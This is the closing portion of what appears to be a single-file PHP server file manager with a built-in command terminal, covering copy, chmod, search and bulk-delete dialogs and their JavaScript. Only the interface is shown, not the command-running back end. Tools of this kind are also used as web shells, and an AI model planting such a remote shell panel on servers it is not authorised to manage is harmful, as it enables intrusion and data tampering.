                    <button type="button" class="btn btn-sm" onclick="closeModal('newfileModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Copy Modal -->
    <div class="modal-overlay" id="copyModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('copyModal')">✕</button>
            <h3>📋 Copy File</h3>
            <form method="post">
                <input type="hidden" name="action" value="copy">
                <input type="hidden" name="srcpath" id="copySrcPath">
                <input type="text" name="copyname" id="copySrcName" placeholder="New filename" autocomplete="off">
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('copyModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Copy</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Chmod Modal -->
    <div class="modal-overlay" id="chmodModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('chmodModal')">✕</button>
            <h3>🔑 Change Permissions (chmod)</h3>
            <form method="post">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="chmodpath" id="chmodPath">
                <input type="text" name="chmodval" id="chmodVal" placeholder="e.g. 755 or 644" maxlength="4"
                    autocomplete="off" pattern="[0-7]{3,4}">
                <div style="font-size:11px;color:#6e7681;margin-bottom:8px;">Current: <span id="chmodCurrent"></span>
                </div>
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('chmodModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Apply</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Search Modal -->
    <div class="modal-overlay" id="searchModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('searchModal')">✕</button>
            <h3>🔍 Search in <?= htmlspecialchars(basename($currentDir)) ?>/</h3>
            <form method="post">
                <input type="hidden" name="action" value="search">
                <input type="text" name="keyword" placeholder="Filename keyword..." autocomplete="off" autofocus>
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('searchModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Search</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // --- Terminal functions ---
        function fillCmd(v) { if (v) { var i = document.getElementById('cmdInput'); i.value = v; i.focus(); } }
        function clearHist() {
            fetch('?', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'action=clear_history' })
                .then(() => location.reload());
        }
        window.onload = function () {
            document.getElementById('cmdInput').focus();
            var o = document.getElementById('outputArea');
            if (o) o.scrollTop = o.scrollHeight;
        };
        document.addEventListener('keydown', function (e) {
            if (e.ctrlKey && e.key === 'l') { e.preventDefault(); document.getElementById('cmdInput').focus(); }
            if (e.key === 'Escape') { document.querySelectorAll('.modal-overlay.show').forEach(m => m.classList.remove('show')); }
        });

        // --- Modal functions ---
        function openModal(id) { document.getElementById(id).classList.add('show'); setTimeout(() => { var f = document.querySelector('#' + id + ' input[type=text]'); if (f) f.focus(); }, 50); }
        function closeModal(id) { document.getElementById(id).classList.remove('show'); }

        // --- Action handlers via data attributes (safe from special characters) ---
        document.addEventListener('click', function(e) {
            // Rename button
            if (e.target.classList.contains('rename-btn')) {
                var path = e.target.getAttribute('data-path');
                var name = e.target.getAttribute('data-name');
                if (path) openRenameModal(path, name);
            }
            // Copy button
            if (e.target.classList.contains('copy-btn')) {
                var path = e.target.getAttribute('data-path');
                var name = e.target.getAttribute('data-name');
                if (path) openCopyModal(path, name);
            }
            // Chmod button
            if (e.target.classList.contains('chmod-btn')) {
                var path = e.target.getAttribute('data-path');
                var perms = e.target.getAttribute('data-perms');
                if (path) openChmodModal(path, perms);
            }
            // Dir size button
            if (e.target.classList.contains('dirsize-btn')) {
                var path = e.target.getAttribute('data-path');
                var labelId = e.target.getAttribute('data-labelid');
                if (path && labelId) getDirSize(path, labelId);
            }
        });

        function openRenameModal(path, name) {
            document.getElementById('renameOldPath').value = path;
            document.getElementById('renameNewName').value = name;
            openModal('renameModal');
            setTimeout(() => { document.getElementById('renameNewName').select(); }, 60);
        }

        function openCopyModal(path, name) {
            document.getElementById('copySrcPath').value = path;
            document.getElementById('copySrcName').value = 'copy_' + name;
            openModal('copyModal');
            setTimeout(() => { document.getElementById('copySrcName').select(); }, 60);
        }

        function openChmodModal(path, currentPerm) {
            document.getElementById('chmodPath').value = path;
            document.getElementById('chmodVal').value = currentPerm;
            document.getElementById('chmodCurrent').textContent = currentPerm;
            openModal('chmodModal');
            setTimeout(() => { document.getElementById('chmodVal').select(); }, 60);
        }

        // --- Dir Size (AJAX) ---
        function getDirSize(path, labelId) {
            var el = document.getElementById(labelId);
            if (!el) return;
            el.textContent = '...';
            fetch('?action=dirsize&dir=' + encodeURIComponent(path))
                .then(r => r.json())
                .then(d => {
                    if (d.error) el.textContent = '[err]';
                    else el.textContent = '(' + d.size + ')';
                })
                .catch(() => { el.textContent = '[err]'; });
        }

        // Close modal when clicking outside
        document.querySelectorAll('.modal-overlay').forEach(overlay => {
            overlay.addEventListener('click', function (e) { if (e.target === this) this.classList.remove('show'); });
        });

        // Bulk Delete logic
        let selectAllState = false;
        function toggleSelectAll() {
            selectAllState = !selectAllState;
            document.querySelectorAll('.bulk-cb').forEach(cb => cb.checked = selectAllState);
        }
        function submitBulkDelete() {
            const checked = document.querySelectorAll('.bulk-cb:checked');
            if (checked.length === 0) {
                alert('No files selected.');
                return;
            }
            if (confirm('Delete ' + checked.length + ' selected item(s)?')) {
                document.getElementById('bulkForm').submit();
            }
        }
    </script>
</body>
</html>